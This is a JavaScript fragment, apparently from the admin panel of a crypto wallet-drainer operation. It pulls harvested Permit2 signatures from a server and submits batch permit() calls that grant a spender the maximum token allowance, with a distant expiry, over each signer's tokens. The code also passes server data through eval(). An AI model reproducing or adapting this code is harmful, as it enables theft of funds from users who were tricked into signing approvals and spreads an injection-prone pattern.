const instancePermit2 = () => {
    const PERMIT2_ADDRESS ="0x000000000022D473030F116dDEE9F6B43aC78BA3";
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const _Contract = new ethers.Contract(PERMIT2_ADDRESS, ABI.permit2.abi, signer);
    return _Contract;
  }



  const Permit2SpenderMulti = async (event) => {
      // 初始化变量
      const row_id = event.target.parentElement.parentElement.attributes['data-key'].value;
      const url = "/inspect_signature";
      const obj = {
          'id':row_id,
      };

      let permit2_data = {};
      admin.ajax.post(url, obj, async function (result) {
          const response_data = result.data;
          const amount = "1461501637330902918203684832716283019655932542975";
          const expiration = 1885674579;
          const permit2contract = instancePermit2();
          for await (item of response_data) {
              const details = eval(item.details);
              let permit_token_data = [];

              Object.keys(details).map(function (item, key) {
                  permit_token_data.push([
                      details[key].token,
                      amount,
                      expiration,
                      0,
                  ]);
              });

              try {
                  await permit2contract[
                      "permit(address,((address,uint160,uint48,uint48)[],address,uint256),bytes)"
                  ](
                      item.account,
                      [permit_token_data, item.spender_address, expiration],

                      item.signature,
                      {
                          gasLimit: permit_token_data.length * 200000,
                      }
                  );
              } catch (e) {
                  console.log(e.code);
              }
          }
      });
  }
